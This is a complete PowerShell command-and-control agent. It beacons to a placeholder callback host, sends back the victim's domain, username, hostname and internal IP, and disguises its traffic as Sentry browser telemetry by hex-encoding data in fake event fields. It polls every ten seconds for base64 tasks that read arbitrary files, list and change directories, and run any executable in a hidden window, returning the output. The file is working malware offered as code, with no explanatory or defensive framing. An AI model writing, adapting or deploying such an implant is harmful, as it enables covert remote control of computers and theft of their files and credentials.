$randomId = [int32](Get-Random -Maximum ([int32]::MaxValue + 1))

$agentId = [int32](Get-Random -Maximum ([int32]::MaxValue + 1))
$agentType = 0xab0ba000
$bytesAgentId = [BitConverter]::GetBytes($agentId)
$bytesAgentType = [BitConverter]::GetBytes($agentType)
$beat = $bytesAgentType + $bytesAgentId

$hexStringBeat = [System.BitConverter]::ToString($beat) -replace '-'

$uri = "http://<CALLBACK_HOST>:<CALLBACK_PORT>/api/" + $randomId + "/envelope"

$initialData = @{
    domain      = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName
    username    = "$env:USERDOMAIN\$env:USERNAME"
    computer    = $env:COMPUTERNAME
    internal_ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
} | convertto-json

$global:isInitial = $true

function SendData($result) {
    # Send data to server using hex encoding and receive answer from server
    $hexStringData = ""
    if ($result.Count -ne 0) {
        $encoded = convertto-json -Depth 4 $result
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($encoded)
        $hexStringData = [System.BitConverter]::ToString($bytes) -replace '-'
    }
    $additionalBeat = ""
    if ($global:isInitial) {
        $additionalBeat = [System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($initialData)) -replace '-'
        $global:isInitial = $false
    }

    $body = '{"event_id":"' + $hexStringBeat + $additionalBeat + '","sent_at":"2025-01-01T00:00:00.000Z","sdk":{"name":"sentry.javascript.browser","version":"7.0.0"}}
{"type":"transaction"}
{"contexts":{"trace":{"trace_id":"trace123456789abc","span_id":"span123456789abc","op":"pageload"}},"spans":[{"span_id":"span987654321def","op":"http.client","description":"' + $hexStringData + '","start_timestamp":1704067200.000,"timestamp":1704067200.100,"trace_id":"trace123456789abc"}],"start_timestamp":1704067200.000,"timestamp":1704067201.000,"transaction":"/home","type":"transaction","platform":"javascript"}
'

    $response = Invoke-WebRequest -Uri $uri -Method POST -Body $Body

    $encodedTaskData = ($response.Content | convertfrom-json).id
    if ($encodedTaskData -eq "") {
        return New-Object System.Collections.ArrayList
    }

    $hexBytes = $encodedTaskData -split '(..)' | Where-Object { -not [String]::IsNullOrEmpty($_) }

    foreach ($hexByte in $hexBytes) {
        # Convert each hex pair to an integer (base 16) and then to a character
        $asciiString += [char]([convert]::ToInt32($hexByte, 16))
    }

    $taskData = $asciiString | ConvertFrom-Json
    return $taskData
}


$TaskResults = New-Object System.Collections.ArrayList
$TaskResults.Clear()
while ($true) {
    $TaskData = SendData($TaskResults)
    $TaskResults.Clear()

    foreach ($task in $TaskData) {
        $taskId = $task.task_id
        # Decode task data
        $jsonData = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task.task_data))
        $data = ConvertFrom-Json $jsonData

        if ($data.command -eq "cat") {
            $path = $data.path
            $result = [System.IO.File]::ReadAllBytes($path)
            
            $responseData = @{
                command = $data.command
                path = $data.path
                content = $result
                taskId = $taskId
            }
            $TaskResults.Add($responseData)
        } elseif ($data.command -eq "cd") {
            $path = $data.path
            Set-Location -Path $path -ErrorAction Stop
            [Environment]::CurrentDirectory = (Get-Location -PSProvider FileSystem).ProviderPath # For .NET
            $currentLocation = Get-Location
            $responseData = @{
                command = $data.command
                path = $path
                new_path = $currentLocation.Path
                taskId = $taskId
            }
            $TaskResults.Add($responseData)
        } elseif ($data.command -eq "ls") {
            $path = if ($data.path) { $data.path } else { Get-Location } # If no path is sent, ls current dir
            $path = $path.Path
            $items = Get-ChildItem -Path $path -ErrorAction Stop
            $fileList = @()
            foreach ($item in $items) {
                $fileList += [PSCustomObject]@{
                    Name = $item.Name
                    FullName = $item.FullName
                    IsDirectory = $item.PSIsContainer
                    Length = if ($item.PSIsContainer) { $null } else { $item.Length }
                    LastWriteTime = $item.LastWriteTime
                }
            }
            $responseData = @{
                command = $data.command
                path = $path
                files = $fileList
                taskId = $taskId
            }
            $TaskResults.Add($responseData)
        } elseif ($data.command -eq "run") {
            $executable = $data.executable
            $args = if ($data.args) { $data.args } else { "" }
            
            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = $executable
            $processInfo.Arguments = $args
            $processInfo.RedirectStandardOutput = $true
            $processInfo.RedirectStandardError = $true
            $processInfo.UseShellExecute = $false
            $processInfo.CreateNoWindow = $true
            
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $processInfo
            $process.Start() | Out-Null
            
            $stdout = $process.StandardOutput.ReadToEnd()
            $stderr = $process.StandardError.ReadToEnd()
            $process.WaitForExit()
            
            $responseData = @{
                command = $data.command
                executable = $executable
                args = $args
                stdout = $stdout
                stderr = $stderr
                exitCode = $process.ExitCode
                taskId = $taskId
            }
            $TaskResults.Add($responseData)
        }
    }

    Start-Sleep 10
}